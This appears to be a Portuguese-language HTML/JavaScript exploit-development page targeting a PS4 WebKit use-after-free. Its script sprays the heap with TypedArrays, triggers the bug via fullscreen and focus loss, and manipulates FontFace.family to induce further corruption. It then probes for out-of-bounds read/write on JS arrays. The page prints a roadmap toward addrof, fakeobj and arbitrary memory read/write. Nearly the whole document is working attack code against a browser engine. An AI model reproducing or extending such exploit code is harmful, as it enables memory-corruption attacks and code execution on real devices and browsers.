
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 UAF - FontFace Manipulation Analysis</title>
<style>
body { 
    font-family: monospace; 
    background: #000; 
    color: #0f0; 
    padding: 20px;
}
.box {
    border: 2px solid #0a0;
    padding: 15px;
    margin: 10px 0;
    background: #001100;
}
.critical { background: #330033 !important; border-color: #f0f !important; color: #f0f; }
.success { background: #003300 !important; border-color: #0f0 !important; }
button {
    background: #0a0;
    color: #000;
    border: none;
    padding: 15px 30px;
    font-size: 18px;
    cursor: pointer;
}
.hex { color: #ff0; font-weight: bold; }
.addr { color: #0ff; font-weight: bold; }
pre { background: #001100; border: 1px solid #0a0; padding: 10px; overflow-x: auto; }
</style>
</head>
<body>

<h1>üî¨ FontFace Manipulation - An√°lise Profunda</h1>

<div class="box critical">
    <h2>üéØ HIP√ìTESE</h2>
    <p>Modificar <b>font.family</b> ap√≥s UAF pode triggerar SEGUNDO UAF ou heap confusion!</p>
    <p>Vamos isolar exatamente O QUE est√° sendo corrompido.</p>
</div>

<div class="box">
    <h2>TESTE DETALHADO: Font.family Manipulation</h2>
    <button onclick="runDetailedTest()">‚ñ∂ EXECUTAR AN√ÅLISE PROFUNDA</button>
    <div id="result"></div>
</div>

<script>
function f2i(f) {
    let buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = f;
    return (new BigUint64Array(buf))[0];
}

function i2f(i) {
    let buf = new ArrayBuffer(8);
    (new BigUint64Array(buf))[0] = BigInt(i);
    return (new Float64Array(buf))[0];
}

function hex(n) {
    return '0x' + n.toString(16).padStart(16, '0');
}

const PATTERN_A = 2.121995791e-314; // 0x4141414141414141

function runDetailedTest() {
    const result = document.getElementById('result');
    result.innerHTML = '<h3>üî¨ AN√ÅLISE PROFUNDA</h3>';
    
    // === ESTRUTURA DE DADOS ===
    let state = {
        before_manipulation: {
            arrays: [],
            typed: null,
            fonts: []
        },
        after_manipulation: {
            arrays: [],
            typed: null,
            fonts: []
        }
    };
    
    result.innerHTML += '<div class="box critical">';
    result.innerHTML += '<b>ESTRAT√âGIA:</b><br>';
    result.innerHTML += '1. Criar estrutura controlada<br>';
    result.innerHTML += '2. Trigger UAF inicial<br>';
    result.innerHTML += '3. SNAPSHOT do estado ANTES de manipular fonts<br>';
    result.innerHTML += '4. Manipular font.family<br>';
    result.innerHTML += '5. SNAPSHOT do estado DEPOIS<br>';
    result.innerHTML += '6. COMPARAR e identificar O QUE mudou<br>';
    result.innerHTML += '</div><br>';
    
    result.innerHTML += '<b>FASE 1: Criando estrutura controlada</b><br>';
    
    // Arrays alvo (JS regular arrays)
    let target_arrays = [];
    for(let i = 0; i < 300; i++) {
        let arr = [0xAAAA0000 + i, 0xBBBB0000 + i, 0xCCCC0000 + i, 0xDDDD0000 + i];
        target_arrays.push(arr);
    }
    result.innerHTML += `‚úì ${target_arrays.length} arrays JS criados<br>`;
    
    // TypedArrays de controle
    let typed_controllers = [];
    for(let i = 0; i < 2000; i++) {
        let arr = new Float64Array(8);
        arr[0] = i;
        typed_controllers.push(arr);
    }
    result.innerHTML += `‚úì ${typed_controllers.length} TypedArrays criados<br>`;
    
    // FontFace objects
    let font_objects = [];
    for(let i = 0; i < 500; i++) {
        try {
            let font = new FontFace(
                'TestFont' + i,
                'url(data:font/woff2;base64,d09GMgABAAAAAAMoAA0AAAAABRAAAALIAAAAA)',
                {}
            );
            font_objects.push(font);
        } catch(e) {}
    }
    result.innerHTML += `‚úì ${font_objects.length} FontFace criados<br><br>`;
    
    // TRIGGER
    result.innerHTML += '<h3>‚è≥ APERTE OPTIONS AGORA!</h3>';
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        result.innerHTML += '<br><h3>üî• FASE 2: UAF TRIGGER</h3>';
        
        // Spray
        let spray = [];
        for(let i = 0; i < 5000; i++) {
            let ta = new Float64Array(10);
            ta.fill(PATTERN_A);
            spray.push(ta);
        }
        result.innerHTML += '‚úì Spray executado<br><br>';
        
        // === SNAPSHOT ANTES ===
        result.innerHTML += '<h3>üì∏ SNAPSHOT ANTES DA MANIPULA√á√ÉO</h3>';
        
        let corrupted_typed = null;
        for(let i = 0; i < typed_controllers.length; i++) {
            if (typed_controllers[i][0] === PATTERN_A) {
                corrupted_typed = i;
                result.innerHTML += `‚úì TypedArray[${i}] corrompido (UAF base ativo)<br>`;
                break;
            }
        }
        
        if (!corrupted_typed) {
            result.innerHTML += '‚ùå UAF base falhou<br>';
            return;
        }
        
        // Snapshot arrays ANTES
        result.innerHTML += '<br><b>Estado dos arrays JS ANTES:</b><br>';
        result.innerHTML += '<pre style="max-height: 200px; overflow-y: scroll;">';
        for(let i = 0; i < Math.min(50, target_arrays.length); i++) {
            result.innerHTML += `[${i}] length=${target_arrays[i].length} values=[${target_arrays[i].slice(0, 4).map(v => '0x' + v.toString(16)).join(', ')}]\n`;
        }
        result.innerHTML += '</pre>';
        
        // Snapshot TypedArray ANTES
        result.innerHTML += '<br><b>TypedArray[${corrupted_typed}] offsets ANTES:</b><br>';
        result.innerHTML += '<pre style="max-height: 200px; overflow-y: scroll;">';
        let before_offsets = [];
        for(let offset = 0; offset < 64; offset++) {
            try {
                const val = typed_controllers[corrupted_typed][offset];
                const as_int = f2i(val);
                before_offsets[offset] = as_int;
                
                if (as_int !== 0n && as_int !== f2i(PATTERN_A) && as_int !== 0x7ff8000000000000n) {
                    result.innerHTML += `[${offset}] ${hex(as_int)}\n`;
                }
            } catch(e) {
                before_offsets[offset] = null;
            }
        }
        result.innerHTML += '</pre><br>';
        
        // === MANIPULA√á√ÉO CR√çTICA ===
        result.innerHTML += '<h3>üî® FASE 3: MANIPULANDO FONT.FAMILY</h3>';
        result.innerHTML += 'Modificando family de todos os FontFace...<br>';
        
        for(let i = 0; i < font_objects.length; i++) {
            try {
                // Modifica√ß√£o gradual com diferentes padr√µes
                if (i % 3 === 0) {
                    font_objects[i].family = 'Hammer' + i;
                } else if (i % 3 === 1) {
                    font_objects[i].family = 'Trigger' + i;
                } else {
                    font_objects[i].family = 'Mutate' + i;
                }
            } catch(e) {}
        }
        
        result.innerHTML += '‚úì Todos os family names modificados<br><br>';
        
        // For√ßar mais opera√ß√µes
        result.innerHTML += 'For√ßando opera√ß√µes adicionais...<br>';
        for(let i = 0; i < font_objects.length; i++) {
            try {
                // Acessar propriedades para triggerar getters
                let f = font_objects[i].family;
                let s = font_objects[i].status;
            } catch(e) {}
        }
        result.innerHTML += '‚úì Opera√ß√µes executadas<br><br>';
        
        // === SNAPSHOT DEPOIS ===
        result.innerHTML += '<h3>üì∏ SNAPSHOT DEPOIS DA MANIPULA√á√ÉO</h3>';
        
        // Snapshot arrays DEPOIS
        result.innerHTML += '<b>Estado dos arrays JS DEPOIS:</b><br>';
        result.innerHTML += '<pre style="max-height: 200px; overflow-y: scroll;">';
        let arrays_changed = [];
        for(let i = 0; i < Math.min(50, target_arrays.length); i++) {
            const before_len = 4;
            const after_len = target_arrays[i].length;
            
            if (after_len !== before_len) {
                result.innerHTML += `<span class="success">[${i}] length=${after_len} (MUDOU de ${before_len}!) values=[${target_arrays[i].slice(0, 8).map(v => '0x' + (v ? v.toString(16) : '?')).join(', ')}]</span>\n`;
                arrays_changed.push(i);
            } else {
                result.innerHTML += `[${i}] length=${after_len} values=[${target_arrays[i].slice(0, 4).map(v => '0x' + v.toString(16)).join(', ')}]\n`;
            }
        }
        result.innerHTML += '</pre>';
        
        // Snapshot TypedArray DEPOIS
        result.innerHTML += '<br><b>TypedArray[${corrupted_typed}] offsets DEPOIS:</b><br>';
        result.innerHTML += '<pre style="max-height: 200px; overflow-y: scroll;">';
        let offsets_changed = [];
        for(let offset = 0; offset < 64; offset++) {
            try {
                const val = typed_controllers[corrupted_typed][offset];
                const as_int = f2i(val);
                
                if (before_offsets[offset] !== as_int) {
                    result.innerHTML += `<span class="addr">[${offset}] ${hex(before_offsets[offset] || 0n)} ‚Üí ${hex(as_int)} (MUDOU!)</span>\n`;
                    offsets_changed.push(offset);
                } else if (as_int !== 0n && as_int !== f2i(PATTERN_A) && as_int !== 0x7ff8000000000000n) {
                    result.innerHTML += `[${offset}] ${hex(as_int)}\n`;
                }
            } catch(e) {}
        }
        result.innerHTML += '</pre><br>';
        
        // === AN√ÅLISE DIFERENCIAL ===
        result.innerHTML += '<h3>üìä AN√ÅLISE DIFERENCIAL</h3>';
        result.innerHTML += '<div class="box ' + (arrays_changed.length > 0 || offsets_changed.length > 0 ? 'success' : 'warning') + '">';
        
        result.innerHTML += `<b>Arrays JS modificados:</b> ${arrays_changed.length}<br>`;
        result.innerHTML += `<b>TypedArray offsets modificados:</b> ${offsets_changed.length}<br><br>`;
        
        if (arrays_changed.length > 0) {
            result.innerHTML += '<h3 class="success">üéØ CR√çTICO: ARRAYS JS CORROMPIDOS!</h3>';
            result.innerHTML += `${arrays_changed.length} arrays tiveram o length modificado!<br><br>`;
            
            result.innerHTML += '<b>Testando leitura OOB no primeiro array corrompido:</b><br>';
            const victim_idx = arrays_changed[0];
            result.innerHTML += `<br>Array[${victim_idx}] length: ${target_arrays[victim_idx].length}<br>`;
            result.innerHTML += 'Tentando ler offsets al√©m do original (4):<br>';
            result.innerHTML += '<pre>';
            
            for(let j = 0; j < Math.min(32, target_arrays[victim_idx].length); j++) {
                try {
                    const val = target_arrays[victim_idx][j];
                    if (val !== undefined) {
                        const type = typeof val;
                        if (type === 'number') {
                            result.innerHTML += `  [${j}] 0x${val.toString(16)} (${type})\n`;
                        } else if (type === 'object' && val !== null) {
                            result.innerHTML += `  [${j}] ${type} (poss√≠vel ponteiro de objeto!)\n`;
                        } else {
                            result.innerHTML += `  [${j}] ${val} (${type})\n`;
                        }
                    }
                } catch(e) {
                    result.innerHTML += `  [${j}] ERRO: ${e.message}\n`;
                }
            }
            result.innerHTML += '</pre><br>';
            
            result.innerHTML += '<h3>üöÄ VOC√ä TEM UMA PRIMITIVA OOB!</h3>';
            result.innerHTML += '<b>Isto significa:</b><br>';
            result.innerHTML += '‚úÖ Voc√™ pode ler AL√âM do array original<br>';
            result.innerHTML += '‚úÖ Poss√≠vel acesso a objetos adjacentes no heap<br>';
            result.innerHTML += '‚úÖ Base para construir addrof() e fakeobj()<br>';
            result.innerHTML += '‚úÖ Caminho para arbitrary R/W completo!<br><br>';
            
            result.innerHTML += '<b>PR√ìXIMOS PASSOS:</b><br>';
            result.innerHTML += '1. Usar OOB read para procurar ponteiros de objetos JS<br>';
            result.innerHTML += '2. Criar objetos conhecidos e procur√°-los no OOB<br>';
            result.innerHTML += '3. Construir addrof(obj) para obter endere√ßos<br>';
            result.innerHTML += '4. Construir fakeobj(addr) para criar objetos falsos<br>';
            result.innerHTML += '5. Usar fakeobj() para criar ArrayBuffer com backing store control√°vel<br>';
            result.innerHTML += '6. ARBITRARY READ/WRITE completo!<br>';
            
        } else if (offsets_changed.length > 0) {
            result.innerHTML += '<h3>‚ö†Ô∏è MUDAN√áAS DETECTADAS NO TYPEDARRAY</h3>';
            result.innerHTML += `${offsets_changed.length} offsets foram modificados ap√≥s manipular fonts!<br><br>`;
            result.innerHTML += 'Isto indica intera√ß√£o entre FontFace e TypedArray heap.<br>';
            result.innerHTML += 'Pode haver uma janela de explora√ß√£o aqui.<br>';
            
        } else {
            result.innerHTML += '<h3>‚ö†Ô∏è NENHUMA MUDAN√áA SIGNIFICATIVA</h3>';
            result.innerHTML += 'A manipula√ß√£o de font.family n√£o causou corrup√ß√£o adicional.<br>';
            result.innerHTML += 'Apenas o UAF base de TypedArray est√° ativo.<br><br>';
            result.innerHTML += '<b>Isto significa:</b><br>';
            result.innerHTML += '‚Ä¢ FontFace usa pool diferente E n√£o interage com TypedArray<br>';
            result.innerHTML += '‚Ä¢ OU a vers√£o do WebKit tem mitiga√ß√µes contra FontFace UAF<br>';
            result.innerHTML += '‚Ä¢ O UAF base continua v√°lido, mas isolado<br>';
        }
        
        result.innerHTML += '</div>';
        
        // === TESTE ADICIONAL: VERIFICAR SE CONSEGUIMOS ESCREVER ===
        if (arrays_changed.length > 0) {
            result.innerHTML += '<br><h3>üîß TESTE ADICIONAL: TENTANDO ESCREVER VIA OOB</h3>';
            const victim_idx = arrays_changed[0];
            
            try {
                const original_length = target_arrays[victim_idx].length;
                
                // Tentar escrever em offset al√©m do original
                target_arrays[victim_idx][10] = 0xDEADBEEF;
                target_arrays[victim_idx][11] = 0xCAFEBABE;
                
                // Verificar se escrita funcionou
                const readback_10 = target_arrays[victim_idx][10];
                const readback_11 = target_arrays[victim_idx][11];
                
                result.innerHTML += '<pre>';
                result.innerHTML += `Escrito em [10]: 0xDEADBEEF\n`;
                result.innerHTML += `Lido de [10]: 0x${readback_10.toString(16)}\n`;
                result.innerHTML += `Escrito em [11]: 0xCAFEBABE\n`;
                result.innerHTML += `Lido de [11]: 0x${readback_11.toString(16)}\n`;
                result.innerHTML += '</pre>';
                
                if (readback_10 === 0xDEADBEEF && readback_11 === 0xCAFEBABE) {
                    result.innerHTML += '<div class="box success">';
                    result.innerHTML += '<h3>üéØüéØüéØ PRIMITIVA OOB READ/WRITE CONFIRMADA! üéØüéØüéØ</h3>';
                    result.innerHTML += '<b>VOC√ä TEM ARBITRARY READ/WRITE VIA OOB!</b><br>';
                    result.innerHTML += 'Este √© o EXPLOIT COMPLETO!<br>';
                    result.innerHTML += '</div>';
                }
                
            } catch(e) {
                result.innerHTML += `‚ö†Ô∏è Erro ao testar escrita: ${e}<br>`;
            }
        }
    };
}

</script>

<hr>
<p style="color: #888;">
<b>üéØ OBJETIVO DESTE TESTE:</b><br>
Identificar EXATAMENTE o que muda quando manipulamos font.family:<br>
‚Ä¢ Arrays JS t√™m length expandido? ‚Üí OOB primitivo direto<br>
‚Ä¢ TypedArray offsets mudam? ‚Üí Segundo UAF ou heap confusion<br>
‚Ä¢ Nenhuma mudan√ßa? ‚Üí FontFace isolado tamb√©m<br>
<br>
Este teste √© CR√çTICO para determinar o pr√≥ximo passo!
</p>

</body>
</html>
